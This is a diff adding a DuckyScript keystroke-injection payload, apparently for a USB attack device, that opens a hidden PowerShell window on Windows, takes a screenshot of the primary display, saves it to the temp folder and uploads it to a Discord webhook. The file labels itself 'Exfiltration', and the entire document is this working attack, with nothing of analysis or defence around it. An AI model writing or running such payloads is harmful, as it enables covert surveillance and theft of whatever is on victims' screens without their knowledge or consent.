@@ -1,0 +1,40 @@
+REM Author: UNC0V3R3D
+REM Description: Takes a screenshot and sends it to a Discord webhook via PowerShell.
+REM Version: 1.0
+REM Category: Exfiltration
+REM Target: Windows 10/11
+REM Requirements: Internet connection, Discord webhook URL
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1500
+STRING Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+ENTER
+DELAY 400
+STRING $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+ENTER
+STRING $bmp = New-Object System.Drawing.Bitmap($sc.Width,$sc.Height)
+ENTER
+STRING $gfx = [System.Drawing.Graphics]::FromImage($bmp)
+ENTER
+STRING $gfx.CopyFromScreen($sc.Location,[System.Drawing.Point]::Empty,$sc.Size)
+ENTER
+STRING $path = "$env:TEMP\screenshot.png"; $bmp.Save($path)
+ENTER
+DELAY 1000
+STRING $wh = 'DISCORD_WEBHOOK_URL'
+ENTER
+STRING $form = New-Object System.Net.Http.MultipartFormDataContent
+ENTER
+STRING $bytes = [System.IO.File]::ReadAllBytes($path)
+ENTER
+STRING $form.Add([System.Net.Http.ByteArrayContent]::new($bytes),'file','screenshot.png')
+ENTER
+STRING (New-Object System.Net.Http.HttpClient).PostAsync($wh,$form).Wait()
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+REM End of payload
